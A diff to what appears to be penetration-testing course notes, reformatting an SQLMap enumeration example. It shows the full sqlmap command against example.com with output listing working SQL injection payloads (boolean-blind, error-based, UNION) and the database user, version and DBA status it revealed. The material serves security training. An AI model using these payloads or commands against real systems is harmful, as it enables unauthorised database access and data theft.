@@ -1186,14 +1186,60 @@ Enumeration usually starts with the retrieval of the basic information:
 
 The following SQLMap command does all of the above:
 
-        shellsession
-`adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba         ___       __H__ ___ ___[']_____ ___ ___  {1.4.9} |_ -| . [']     | .'| . | |___|_  [.]_|_|_|__,|  _|       |_|V...       |_|   http://sqlmap.org [*] starting @ 13:30:57 /2020-09-17/ [13:30:57] [INFO] resuming back-end DBMS 'mysql'  [13:30:57] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: id (GET)     Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1 AND 5134=5134     Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(5907=5907,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)     Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170766b71,0x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,0x7178707671)-- - --- [13:30:57] [INFO] the back-end DBMS is MySQL [13:30:57] [INFO] fetching banner web application technology: PHP 5.2.6, Apache 2.2.9 back-end DBMS: MySQL >= 5.0 banner: '5.1.41-3~bpo50+1' [13:30:58] [INFO] fetching current user current user: 'root@%' [13:30:58] [INFO] fetching current database current database: 'testdb' [13:30:58] [INFO] testing if current user is DBA [13:30:58] [INFO] fetching current user current user is DBA: True [13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com' [*] ending @ 13:30:58 /2020-09-17/`
+```shell
+adampueman@htb[/htb]$ sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
+
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.4.9}
+|_ -| . [']     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+
+[*] starting @ 13:30:57 /2020-09-17/
+
+[13:30:57] [INFO] resuming back-end DBMS 'mysql' 
+[13:30:57] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5134=5134
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1 AND (SELECT 5907 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(5907=5907,1))),0x7178707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170766b71,0x7a76726a6442576667644e6b476e577665615168564b7a696a6d4646475159716f784f5647535654,0x7178707671)-- -
+---
+[13:30:57] [INFO] the back-end DBMS is MySQL
+[13:30:57] [INFO] fetching banner
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: MySQL >= 5.0
+banner: '5.1.41-3~bpo50+1'
+[13:30:58] [INFO] fetching current user
+current user: 'root@%'
+[13:30:58] [INFO] fetching current database
+current database: 'testdb'
+[13:30:58] [INFO] testing if current user is DBA
+[13:30:58] [INFO] fetching current user
+current user is DBA: True
+[13:30:58] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/www.example.com'
+
+[*] ending @ 13:30:58 /2020-09-17/
+```
 
 From the above example, we can see that the database version is quite old (MySQL 5.1.41 - from November 2009), and the current user name is `root`, while the current database name is `testdb`.
 
-Note: The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.
-
----
+> Note: The 'root' user in the database context in the vast majority of cases does not have any relation with the OS user "root", other than that representing the privileged user within the DBMS context. This basically means that the DB user should not have any constraints within the database context, while OS privileges (e.g. file system writing to arbitrary location) should be minimalistic, at least in the recent deployments. The same principle applies for the generic 'DBA' role.
+<div align="center">
+<br>
+<br>
+</div>
 
 ## Table Enumeration
 
